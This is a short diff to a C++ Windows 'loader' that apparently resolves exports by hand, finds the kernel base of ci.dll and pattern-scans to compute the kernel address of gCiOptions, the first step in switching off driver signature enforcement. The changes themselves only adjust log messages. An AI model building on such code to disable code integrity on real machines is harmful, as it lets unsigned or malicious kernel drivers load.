@@ -39,14 +39,13 @@ uintptr_t loader::HdnGetProcAddress( void* hModule, const wchar_t* wAPIName )
                 if ( !CompareStrings( szNames, wAPIName ) )
                 {
                     unsigned short usOrdinal = reinterpret_cast< unsigned short* >( lpBase + iedExportDirectory->AddressOfNameOrdinals )[uiIter];
+                    std::cout << "[*] Found at 0x" << std::hex << reinterpret_cast< uintptr_t >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfFunctions )[usOrdinal] );
                     return reinterpret_cast< uintptr_t >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfFunctions )[usOrdinal] );
-                    std::cout << "Found 0x%p" << reinterpret_cast< uintptr_t >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfFunctions )[usOrdinal] );
                 }
             }
         }
 
     }
-    std::cout << "fail";
     return 0;
 }
 
@@ -158,7 +157,7 @@ uintptr_t loader::GetCiDllKernelBase() {
     for ( ULONG i = 0; i < buffer->NumberOfModules; i++ ) {
         char* moduleName = ( char* )( buffer->Modules[i].FullPathName + buffer->Modules[i].OffsetToFileName );
         if ( _stricmp( moduleName, "ci.dll" ) == 0 ) {
-            std::cout << "[+] Found ci.dll kernel base at: 0x" << std::hex << ( uintptr_t )buffer->Modules[i].ImageBase << std::endl;
+            std::cout << "[*] Found ci.dll kernel base at: 0x" << std::hex << ( uintptr_t )buffer->Modules[i].ImageBase << std::endl;
             ciBase = ( uintptr_t )buffer->Modules[i].ImageBase;
             break;
         }
@@ -181,7 +180,7 @@ uintptr_t loader::GetCipInitializeAddr( uintptr_t CiInitialize ) {
             int32_t rel = *reinterpret_cast< int32_t* >( &code[i + 1] );
             uintptr_t CipInitialize = CiInitialize + i + 5 + rel;
 
-            std::cout << "[+] Found call at +0x" << std::hex << i
+            std::cout << "[*] Found call at +0x" << std::hex << i
                 << " CipInitialize = 0x" << CipInitialize << std::endl;
             return CipInitialize;
         }
@@ -198,10 +197,10 @@ uintptr_t loader::Get_gCiOptions_Addr( uintptr_t CipInitialize, uintptr_t mapped
             int32_t rel = *reinterpret_cast< int32_t* >( &code[i + 3] );
             uintptr_t gCiOptionsMapped = CipInitialize + i + 7 + rel;
 
-            std::cout << "[+] gCiOptions (mapped VA): 0x" << std::hex << gCiOptionsMapped << std::endl;
+            std::cout << "[*] gCiOptions (mapped VA): 0x" << std::hex << gCiOptionsMapped << std::endl;
 
             uintptr_t gCiOptionsKernel = kernelBase + ( gCiOptionsMapped - mappedBase );
-            std::cout << "[+] gCiOptions (kernel VA): 0x" << std::hex << gCiOptionsKernel << std::endl;
+            std::cout << "[*] gCiOptions (kernel VA): 0x" << std::hex << gCiOptionsKernel << std::endl;
 
             return gCiOptionsKernel;
         }
